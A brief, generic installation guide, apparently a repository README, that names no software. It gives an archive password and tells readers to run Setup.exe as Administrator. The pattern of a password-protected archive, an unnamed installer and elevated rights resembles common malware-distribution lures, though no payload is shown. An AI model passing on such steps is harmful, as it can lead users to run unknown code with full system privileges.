# 🛠 Universal Installation Guide

Follow the steps below to install the software correctly.

### 1️⃣ Download the Files

Download the compressed archive from this repository.

---

### 2️⃣ Extract the Archive

Extract the downloaded file using one of these tools:

• WinRAR
• 7-Zip
• Windows built-in extractor

---

### 3️⃣ Archive Password

If extraction requires a password, use:

```
671440688923543
```

---

### 4️⃣ Open Extracted Folder

Navigate to the extracted folder and locate the installer file:

```
Setup.exe
```

or the installation ISO file.

---

### 5️⃣ Run Installer

Right-click the installer and choose:

```
Run as Administrator
```

Follow the setup wizard instructions.

---

### 6️⃣ Launch Software

After installation, open the application from:

• Desktop Shortcut
• Start Menu
• Installed Program Folder
